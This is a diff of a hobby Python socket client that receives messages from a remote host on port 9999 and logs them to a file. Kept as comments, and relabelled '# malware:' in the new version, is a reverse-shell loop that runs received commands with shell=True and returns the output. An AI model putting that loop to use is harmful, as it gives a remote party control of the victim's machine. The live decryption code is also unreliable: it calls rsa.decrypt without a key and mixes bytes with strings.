@@ -26,21 +26,30 @@ port = 9999
 
 s.connect((host, port))
 
-data = s.recv(1024)
-while data.decode("utf-8") != 'quit':
-    # if data[:2].decode("utf-8") == 'cd':
-    #     os.chdir(data[3:].decode("utf-8"))
-
+#data = s.recv(1024)
+rawData = s.recv(1024)
+for byte in rawData:
+    print(str(byte) + ' ', end='')
+data = rsa.decrypt(rawData)
+#while data.decode("utf-8") != 'quit':
+while data != 'quit':
     if (len(data) > 0):
         with open("messages.txt", "a") as f:
-            f.write(data.decode("utf-8") + '\n')
+            #f.write(data.decode("utf-8") + '\n')
+            f.write(data + '\n')
         s.send(str.encode('Received'))
-    data = s.recv(1024)
-    #     cmd = subprocess.Popen(data[:].decode("utf-8"),  # 'foo'[] -> syntax error, 'foo'[:] -> 'foo'
-    #         shell = True, stdout = subprocess.PIPE, stdin = subprocess.PIPE, stderr = subprocess.PIPE)
-    #     output_byte = cmd.stdout.read() + cmd.stderr.read()
-    #     output_str = str(output_byte, "utf-8")
-    #     currentWD = os.getcwd() + "> "
-    #     s.send(str.encode(output_str + currentWD))
-    #    #s.send(output_byte) #is surely also viable?
-    #     print(output_str)
+    #data = s.recv(1024)
+    data = rsa.decrypt(s.recv(1024))
+
+
+
+
+# malware:
+#     cmd = subprocess.Popen(data[:].decode("utf-8"),  # 'foo'[] -> syntax error, 'foo'[:] -> 'foo'
+#         shell = True, stdout = subprocess.PIPE, stdin = subprocess.PIPE, stderr = subprocess.PIPE)
+#     output_byte = cmd.stdout.read() + cmd.stderr.read()
+#     output_str = str(output_byte, "utf-8")
+#     currentWD = os.getcwd() + "> "
+#     s.send(str.encode(output_str + currentWD))
+#    #s.send(output_byte) #is surely also viable?
+#     print(output_str)
